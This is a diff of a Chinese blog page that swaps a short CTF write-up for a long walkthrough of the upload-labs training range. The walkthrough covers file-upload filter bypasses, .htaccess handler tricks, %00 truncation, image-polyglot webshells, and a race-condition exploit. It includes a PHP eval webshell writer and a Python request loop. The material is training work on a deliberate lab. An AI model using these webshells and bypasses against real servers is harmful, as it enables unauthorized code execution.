@@ -6,30 +6,54 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>[GXYCTF2019]BabyUpload | Hexo</title>
+  <title>upload_labs | Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="[GXYCTF2019]BabyUpload（1）先随便上传png文件看看">
+  <meta name="description" content="upload_labs前言：博主之前因为一些其它的事一直拖拉，终于在这几天把这个靶场完成了。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[GXYCTF2019]BabyUpload">
-<meta property="og:url" content="http://example.com/2022/02/22/GXYCTF2019_BabyUpload/index.html">
+<meta property="og:title" content="upload_labs">
+<meta property="og:url" content="http://example.com/2022/03/03/upload-labs/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="[GXYCTF2019]BabyUpload（1）先随便上传png文件看看">
+<meta property="og:description" content="upload_labs前言：博主之前因为一些其它的事一直拖拉，终于在这几天把这个靶场完成了。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2022/02/22/Nx8Oy5AHWofVgl3.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/22/4rM2se91V85zFyh.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/22/QPZzb5wvXJoypAe.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/22/9iEOodT6tQ1wbFc.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/22/KthdPOGfjs7AywT.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/22/BOpNA4KEkMw1Iso.png">
-<meta property="og:image" content="https://s2.loli.net/2022/02/22/FfnD3HiNIlG2cud.png">
-<meta property="article:published_time" content="2022-02-22T11:42:49.000Z">
-<meta property="article:modified_time" content="2022-02-23T11:56:12.331Z">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/LgZjNuQpdzly5sV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/Ltf9waVI6HFv52c.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/iHrDEZTAFt8x7wW.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/Nx4KPvZgSbI2qYC.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/PxsujQeVNZC5YIr.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/9JBre1iAo8syYmG.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/5bhG3XzoDEKU1e4.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/E1rtwHNmugdFBOe.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/5UgBJqY4v3XiCdL.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/03/kcPGS6EbV18HMxw.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/12/EpyGzjIUDrLJCsw.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/08/xrc1ALH75qfQNTd.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/yMb4tCXBchAKEDw.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/AICGDei8PtzcpRM.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/MUesWS8IdFQVx4g.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/ExJsqopN5jylduC.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/bRiLynB4Zc7lVFN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/rvOgGh1NlKBkwMo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/OXNJ9GyH3MCvKS8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/sQcB8uqTGPZIMhi.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/5rtXpjncO7QzIL2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/X3NFWlvpe4cihAT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/PCqnZHYDsmdKAtV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/7oRj5wftCnQBlqy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/2fp9b348jdCx5cO.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/Nm3v8bRegikTqhB.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/10/yDRFmWJkcBfrX2U.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/11/Et2FQSK1PasZnYT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/11/q1DSQ8r4iZ6X5Ot.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/11/6S3jRhMQC4m5eK2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/11/yvu34oeIB1MJgil.png">
+<meta property="article:published_time" content="2022-03-03T12:32:40.000Z">
+<meta property="article:modified_time" content="2022-03-13T08:36:10.290Z">
 <meta property="article:author" content="00hello00">
-<meta property="article:tag" content="题目">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2022/02/22/Nx8Oy5AHWofVgl3.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/03/03/LgZjNuQpdzly5sV.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -199,22 +223,22 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-GXYCTF2019_BabyUpload" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-upload-labs" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      [GXYCTF2019]BabyUpload
+      upload_labs
     </h1>
   
 
 
   
   
-<a href="/2022/02/22/GXYCTF2019_BabyUpload/" class="archive-article-date">
-        <time datetime="2022-02-22T11:42:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-22</time>
+<a href="/2022/03/03/upload-labs/" class="archive-article-date">
+        <time datetime="2022-03-03T12:32:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-03</time>
 </a>
 
   
@@ -227,7 +251,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">159字</span>
+      <span class="post-count">3.8k字</span>
     </span>
   </span>
 
@@ -236,7 +260,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">16分</span>
     </span>
   </span>
 </div>
@@ -247,17 +271,375 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>（1）先随便上传png文件看看</p>
+    <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload_labs"></a>upload_labs</h1><p>前言：博主之前因为一些其它的事一直拖拉，终于在这几天把这个靶场完成了。</p>
 <span id="more"></span>
 
-<p><img src="https://s2.loli.net/2022/02/22/Nx8Oy5AHWofVgl3.png" alt="图片.png"></p>
-<p>好像不行</p>
-<p>（2）抓包，写一句话木马，不断改后缀，直到jpeg好像传上去了。<br><img src="https://s2.loli.net/2022/02/22/4rM2se91V85zFyh.png" alt="图片.png"></p>
-<p>（3）后缀改成php看看<br><img src="https://s2.loli.net/2022/02/22/QPZzb5wvXJoypAe.png" alt="图片.png"><br>ph的后缀好像都不行</p>
-<p>（4）这时候就要用.htaccess文件把后缀直接更改成php文件<br><img src="https://s2.loli.net/2022/02/22/9iEOodT6tQ1wbFc.png" alt="图片.png"></p>
-<p>（5）抓包<br>改Content-Type:image/jpeg绕过<br><img src="https://s2.loli.net/2022/02/22/KthdPOGfjs7AywT.png" alt="图片.png"><br>filename后缀不要动！只要改改Content-Type:image/jpeg就可以。</p>
-<p>博主设置的.htaccess文件是把带png后缀的文件改为php文件，博主之前也把filename后缀改为jpeg以致一直连接不上蚁剑。</p>
-<p>（6）最后用蚁剑连接，再根目录下找到flag。<br><img src="https://s2.loli.net/2022/02/22/BOpNA4KEkMw1Iso.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/02/22/FfnD3HiNIlG2cud.png" alt="图片.png"></p>
+<p>博主建议过这关靶场时最好自己搭建环境，对于操作和改靶场的bug比较方便。</p>
+<p>靶场链接：<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs%EF%BC%88bug%E6%9C%89%E7%82%B9%E5%B0%8F%E5%A4%9A%EF%BC%8C%E4%B8%80%E4%BA%9B%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E5%8E%BB%E4%BF%AE%E6%94%B9%EF%BC%89">https://github.com/c0ny1/upload-labs（bug有点小多，一些需要自己去修改）</a></p>
+<p>博主是在windows+apache2.4的环境搭建的。（建议用windows搭建）<br><img src="https://s2.loli.net/2022/03/03/LgZjNuQpdzly5sV.png" alt="mind-map.png"><br><img src="https://s2.loli.net/2022/03/03/Ltf9waVI6HFv52c.png" alt="sum_up.png"></p>
+<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>（1）打开页面</p>
+<p><img src="https://s2.loli.net/2022/03/03/iHrDEZTAFt8x7wW.png" alt="图片.png"></p>
+<p>js（JavaScript）检查属于前端验证，在浏览器未提交数据时进行验证。我们可以利用Burp suite来拦截请求，通过修改请求来绕过前端的JavaScript验证，并成功地向服务器提交了数据。</p>
+<p>前端JavaScript验证是为了防止用户输入错误，服务器端验证是为了防止恶意攻击。</p>
+<p>（2）先用png文件格式绕过js验证，用bp抓包、改包，改为php绕过。</p>
+<p><img src="https://s2.loli.net/2022/03/03/Nx4KPvZgSbI2qYC.png" alt="图片.png"></p>
+<p>（3）用蚁剑链接</p>
+<p><img src="https://s2.loli.net/2022/03/03/PxsujQeVNZC5YIr.png" alt="图片.png"></p>
+<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>（1）提示</p>
+<p><img src="https://s2.loli.net/2022/03/03/9JBre1iAo8syYmG.png" alt="图片.png"></p>
+<p>（2）上传php文件，bp抓包，写码，修改数据包的MIME</p>
+<pre><code>   if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) 
+</code></pre>
+<p>由码源知道需要以上的格式。<br><img src="https://s2.loli.net/2022/03/03/5bhG3XzoDEKU1e4.png" alt="图片.png"></p>
+<p>（3）用蚁剑链接</p>
+<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><p>（1）提示</p>
+<p><img src="https://s2.loli.net/2022/03/03/E1rtwHNmugdFBOe.png" alt="图片.png"></p>
+<p>这很明显没有对文件后缀名进行详细的过滤。</p>
+<p>（2）利用.htaccess文件修改png文件的后缀</p>
+<p><img src="https://s2.loli.net/2022/03/03/5UgBJqY4v3XiCdL.png" alt="图片.png"></p>
+<pre><code>//.htaccess文件内容
+&lt;FilesMatch &quot;1.png&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre>
+<ul>
+<li>注：要对apache进行配置，一般的apache关闭了.htaccess文件的使用。</li>
+</ul>
+<p>（3）先上传.htaccess文件，在上传带一句话木马的png文件，便会被当作php文件解析</p>
+<p>（4）蚁剑连接</p>
+<ul>
+<li>注：这里还可以使用开发者工具来查看图片上传的地址</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/03/03/kcPGS6EbV18HMxw.png" alt="图片.png"></p>
+<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p>第四关与第三关方法一致。</p>
+<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><p>（1）提示</p>
+<pre><code>    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &#39;.&#39;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //首尾去空
+</code></pre>
+<p>由于php代码是按由上倒下的顺序执行的，并且deldot、trim函数只执行一次操作。于是我们可以把.php改为.php. .进行绕过。</p>
+<p>（2）bp抓包，改后缀</p>
+<p><img src="https://s2.loli.net/2022/03/12/EpyGzjIUDrLJCsw.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><p>（1）提示</p>
+<pre><code>    $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &#39;.&#39;);
+    $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //首尾去空
+</code></pre>
+<p>（2）没有进行大小写过滤</p>
+<pre><code>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！
+</code></pre>
+<p>把.php改为.Php绕过。</p>
+<p><img src="https://s2.loli.net/2022/03/08/xrc1ALH75qfQNTd.png" alt="图片.png"></p>
+<p>（3）用蚁剑连接</p>
+<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><p>（1）提示</p>
+<pre><code>    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &#39;.&#39;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+</code></pre>
+<p>没有过滤到文件末尾的空格，我们可以利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php （末尾有一个空格）</p>
+<p>（2）bp抓包，修改后缀<br><img src="https://s2.loli.net/2022/03/10/yMb4tCXBchAKEDw.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><p>（1）提示</p>
+<pre><code>    $file_ext = strrchr($file_name, &#39;.&#39;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA
+    $file_ext = trim($file_ext); //首尾去空
+</code></pre>
+<p>少了去“.”，同样我们可以利用Windows系统的文件名特性。文件名后缀改成php .</p>
+<p>（2）bp抓包，修改后缀<br><img src="https://s2.loli.net/2022/03/10/AICGDei8PtzcpRM.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><p>（1）提示</p>
+<pre><code>    $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &#39;.&#39;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = trim($file_ext); //首尾去空
+</code></pre>
+<p>少了去字符串::$DATA，我们可以利用Windows系统的文件名特性。在windows中，会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，起到绕过后端检测的效果。</p>
+<p>（2）bp抓包，修改后缀<br><img src="https://s2.loli.net/2022/03/10/MUesWS8IdFQVx4g.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<p>由于在windows中只会保持::$DATA之前的文件名，所以用蚁剑连接时，要去掉::$DATA</p>
+<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><p>（1）提示</p>
+<pre><code>    $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
+    $file_name = deldot($file_name);//删除文件名末尾的点
+    $file_ext = strrchr($file_name, &#39;.&#39;);
+    $file_ext = strtolower($file_ext); //转换为小写
+    $file_ext = trim($file_ext); //首尾去空
+    ……
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;
+</code></pre>
+<p>与前面几关一样，我们可以利用Windows系统的文件名特性。原文件改成php. .绕过</p>
+<p>（2）bp抓包，修改后缀</p>
+<p><img src="https://s2.loli.net/2022/03/10/ExJsqopN5jylduC.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><p>（1）提示</p>
+<p><img src="https://s2.loli.net/2022/03/10/bRiLynB4Zc7lVFN.png" alt="图片.png"></p>
+<p>既然会去除后缀，那我们不妨尝试一下双写的技巧。把后缀改成.pphphp</p>
+<p>（2）bp抓包，修改后缀</p>
+<p><img src="https://s2.loli.net/2022/03/10/rvOgGh1NlKBkwMo.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><p>（1）提示</p>
+<p><img src="https://s2.loli.net/2022/03/10/OXNJ9GyH3MCvKS8.png" alt="图片.png"></p>
+<pre><code>    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+</code></pre>
+<p>分析代码，这是以时间戳的方式对上传文件进行命名，使用上传路径名%00截断绕过，不过这需要对文件有足够的权限，比如说创建文件夹，上传的文件名写成1.jpg, save_path改成…/upload/1.php%00，最后保存下来的文件就是1.php</p>
+<p>url中，%00对应的ascii码值为0，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束，而忽略后面上传的文件或图片，只上传截断前的文件或图片</p>
+<p>（2）bp抓包修改<br><img src="https://s2.loli.net/2022/03/10/sQcB8uqTGPZIMhi.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<p>当url中出现%00时就会认为读取已结束，所以连接蚁剑时，会自己保存%00以前的内容</p>
+<p><img src="https://s2.loli.net/2022/03/10/5rtXpjncO7QzIL2.png" alt="图片.png"></p>
+<ul>
+<li>ps.php版本要小于5.3.4，magic_quotes_gpc需要为Off状态。可在php的配置文件中修改。<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2></li>
+</ul>
+<p>(1)提示</p>
+<p><img src="https://s2.loli.net/2022/03/10/X3NFWlvpe4cihAT.png" alt="图片.png"></p>
+<p>原理与前一关一样，区别在于前一关采用的是get的方式，这一关用的是post的方式，我们同样可以在bp的hex拦中进行修改。我们在Hex中找到对应的十六进制码（php的十六进制码为70 68 70），因此我们将在这串编码后的值更改为00。</p>
+<p>（2）bp抓包修改<br><img src="https://s2.loli.net/2022/03/10/PCqnZHYDsmdKAtV.png" alt="图片.png"></p>
+<p>先把php文件的后缀改为jpg，upload后加上1.php使文件被解析成php文件</p>
+<p>然后修改hex的值</p>
+<p><img src="https://s2.loli.net/2022/03/10/7oRj5wftCnQBlqy.png" alt="图片.png"></p>
+<p>（3）蚁剑连接</p>
+<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>（1）提示</p>
+<pre><code>function getReailFileType($filename)&#123;
+    $file = fopen($filename, &quot;rb&quot;);
+    $bin = fread($file, 2); //只读2字节
+    fclose($file);
+    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    //把这两字节分别放入数组&quot;C2chars&quot;
+    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    //将字节转化为二进制流
+    $fileType = &#39;&#39;;    
+    switch($typeCode)&#123;      
+        case 255216:            
+            $fileType = &#39;jpg&#39;;
+            break;
+        case 13780:            
+            $fileType = &#39;png&#39;;
+            break;        
+        case 7173:            
+            $fileType = &#39;gif&#39;;
+            break;
+        default:            
+            $fileType = &#39;unknown&#39;;
+        &#125;    
+        return $fileType;
+&#125;
+</code></pre>
+<p>源码通过二进制的方式查看文件前2字节(文件头)是否为合法文件。</p>
+<p>一般而言jpg、png、gif这类格图片格式的前几个字符（16进制下）都是一样的，有些防护手段也是通过这种特征码来判断的。所以我们可以通过构造图片码绕过。</p>
+<ul>
+<li>注：图片码的制作</li>
+</ul>
+<p>a.先将准备好的图片与php代码放入同一文件夹</p>
+<p>b.打开cmd，cd到指定文件夹</p>
+<p>c.执行cmd指令:</p>
+<pre><code>copy 1.jpg /b + 1.php /a 2.jpg
+</code></pre>
+<ul>
+<li>注：识别图片格式的方法<a target="_blank" rel="noopener" href="https://www.jb51.net/article/205800.htm">https://www.jb51.net/article/205800.htm</a></li>
+</ul>
+<p>（2）制作图片码上传</p>
+<p><img src="https://s2.loli.net/2022/03/10/2fp9b348jdCx5cO.png" alt="图片.png"></p>
+<p>因为蚁剑连接不了图片，所以我们用phpinfo这个命令来判断我们成功渗透。</p>
+<p>（3）利用文件包含漏洞，触发图片码</p>
+<p>这里博主搭建的靶场是有漏洞的，upload文件夹里的文件包含漏洞文件会被删除，博主也懒得去找原因，直接复制根目录的文件包含漏洞的文件到upload文件中。</p>
+<p><img src="https://s2.loli.net/2022/03/10/Nm3v8bRegikTqhB.png" alt="图片.png"></p>
+<h2 id="pass15"><a href="#pass15" class="headerlink" title="pass15"></a>pass15</h2><p>（1）提示</p>
+<pre><code>function isImage($filename)&#123;
+    $types = &#39;.jpeg|.png|.gif&#39;;
+    if(file_exists($filename))&#123;
+        $info = getimagesize($filename);//获取图片大小，返回的结果是数组
+        $ext = image_type_to_extension($info[2]);//取得图像类型的文件后缀
+        if(stripos($types,$ext)&gt;=0)&#123;    //查找字符串首次出现的位置
+            return $ext;
+        &#125;else&#123;
+            return false;
+        &#125;
+    &#125;else&#123;
+        return false;
+    &#125;
+&#125;
+</code></pre>
+<p>（2）与上一关的方法相同，上传图片码绕过</p>
+<h2 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h2><p>（1）提示</p>
+<pre><code>function isImage($filename)&#123;
+    //需要开启php_exif模块
+    $image_type = exif_imagetype($filename);//通过exif_imagetype函数检测是否图片格式正确
+    switch ($image_type) &#123;
+        case IMAGETYPE_GIF:
+            return &quot;gif&quot;;
+            break;
+        case IMAGETYPE_JPEG:
+            return &quot;jpg&quot;;
+            break;
+        case IMAGETYPE_PNG:
+            return &quot;png&quot;;
+            break;    
+        default:
+            return false;
+            break;
+    &#125;
+&#125;
+</code></pre>
+<p>（2）也同样与14关方法相同，上传图片码</p>
+<h2 id="pass17"><a href="#pass17" class="headerlink" title="pass17"></a>pass17</h2><p>（1）提示</p>
+<pre><code>else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))&#123;
+            //使用上传的图片生成新的图片
+            $im = imagecreatefromgif($target_path);
+            if($im == false)&#123;
+                $msg = &quot;该文件不是gif格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                //给新图片指定文件名
+                srand(time());
+                $newfilename = strval(rand()).&quot;.gif&quot;;
+                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
+                imagegif($im,$img_path);
+
+                @unlink($target_path);
+                $is_upload = true;
+            &#125;
+        &#125; else &#123;
+            $msg = &quot;上传出错！&quot;;
+        &#125;
+    &#125;else&#123;
+        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>这一关主要考的是二次渲染，我们可以利用gif文件的特性，gif文件在二次渲染之后会保留一段和渲染前相同的内容，而jpg与png则没有这段内容。</p>
+<p>（2）我们先制作gif的图片码，上传，在把上传后的图片下载下来，用010editor比较不同<br><img src="https://s2.loli.net/2022/03/10/yDRFmWJkcBfrX2U.png" alt="图片.png"><br>由于博主之前就把码注入到不变的位置，所以渲染后的图片，仍保存这一段代码。</p>
+<p>（3）利用文件包含，触发图片码</p>
+<h2 id="pass18"><a href="#pass18" class="headerlink" title="pass18"></a>pass18</h2><p>（1）提示</p>
+<pre><code>if(move_uploaded_file($temp_file, $upload_file))&#123; //move_uploaded_file() 函数把上传的文件移动到新位置。
+    if(in_array($file_ext,$ext_arr))&#123;
+         $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+         rename($upload_file, $img_path);
+         $is_upload = true;
+    &#125;else&#123;
+        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+        unlink($upload_file);
+    &#125;
+&#125;else&#123;
+    $msg = &#39;上传出错！&#39;;
+&#125;
+</code></pre>
+<p>本关先通过move_uploaded_file（）移动文件到指定的位置，再对文件后缀进行检查。合法，就重命名；不合法，就用unlink函数删掉。也就是说只要我们在move_uploaded_file（）移动文件后，经行后缀判断前，读取文件，注入webshell就可以了。</p>
+<p>（2）bp不停发送文件。</p>
+<pre><code>上传文件创建新后门的文件
+&lt;?php fputs(fopen(&#39;1.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&#39;);?&gt;
+</code></pre>
+<ul>
+<li>fputs — fwrite() 的别名</li>
+</ul>
+<p>fwrite — 写入文件，这里的意思是把’<?php @eval($_POST["pass"])?>‘的内容写入1.php这个文件中，由于upload文件中不存在1.php这个文件利用了fopen这个函数，来创建1.php这个文件。</p>
+<ul>
+<li><p>fopen() - 打开文件或者 URL，将 filename 指定的名字，资源绑定到一个流上。 </p>
+<pre><code>  fopen( string $filename, string $mode, bool $use_include_path = false, resource $context = ?) : resource
+</code></pre>
+</li>
+</ul>
+<p>‘w’ 写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。  </p>
+<ul>
+<li>注：执行这些函数要有文件的读写权限</li>
+</ul>
+<p>（3）用python脚本不断读取文件实现通过这样的条件竞争来实现注入</p>
+<p>利用python程序中的request模块，不断访问第一次发送的文件，使之创造出新的后门文件。如果成功访问新建的后门文件，则代码执行成功。</p>
+<pre><code># python脚本
+import requests
+
+url_1 = &quot; http://192.168.3.243:81/upload/include.php?file=2.jpg &quot;
+url_2 = &quot; http://192.168.3.243:81/upload/1.php &quot;
+while True:
+    html_1 = requests.get(url_1)
+    html_2 = requests.get(url_2)
+    if html_1.status_code == 200:
+        print(&quot;1&quot;)
+    if html_2.status_code == 200:
+        print(&quot;YES&quot;)
+        break
+    else:
+        print(&quot;NO&quot;)
+</code></pre>
+<p>（4）实际操作</p>
+<p><img src="https://s2.loli.net/2022/03/11/Et2FQSK1PasZnYT.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/03/11/q1DSQ8r4iZ6X5Ot.png" alt="图片.png"></p>
+<p>出现了yes就代表成功了。</p>
+<p>（5）接下来就直接用蚁剑去连接</p>
+<h2 id="pass19"><a href="#pass19" class="headerlink" title="pass19"></a>pass19</h2><h2 id="pass20"><a href="#pass20" class="headerlink" title="pass20"></a>pass20</h2><p>（1）提示</p>
+<pre><code>    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+    $file_name = $_POST[&#39;save_name&#39;];
+    $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+    if(!in_array($file_ext,$deny_ext)) &#123;
+        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
+        if (move_uploaded_file($temp_file, $img_path)) &#123; 
+            $is_upload = true;
+        &#125;
+</code></pre>
+<ul>
+<li>pathinfo( string $path, int $flags = PATHINFO_ALL) : array|string</li>
+</ul>
+<p>pathinfo() 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 flags。</p>
+<p>flag:</p>
+<pre><code>PATHINFO_DIRNAME - 只返回 dirname
+PATHINFO_BASENAME - 只返回 basename
+PATHINFO_EXTENSION - 只返回 extension
+PATHINFO_FILENAME - 只返回 filename
+</code></pre>
